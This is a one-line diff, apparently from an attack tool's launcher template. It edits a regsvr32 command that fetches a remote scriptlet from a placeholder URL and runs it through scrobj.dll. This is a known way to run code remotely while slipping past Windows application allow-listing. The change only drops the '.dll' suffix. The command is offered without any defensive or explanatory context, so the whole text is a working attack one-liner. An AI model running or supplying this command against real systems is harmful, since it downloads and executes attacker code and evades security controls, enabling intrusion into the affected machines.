@@ -1,1 +1,1 @@
-regsvr32 /s /u /n /i:~URL~ scrobj.dll
+regsvr32 /s /u /n /i:~URL~ scrobj
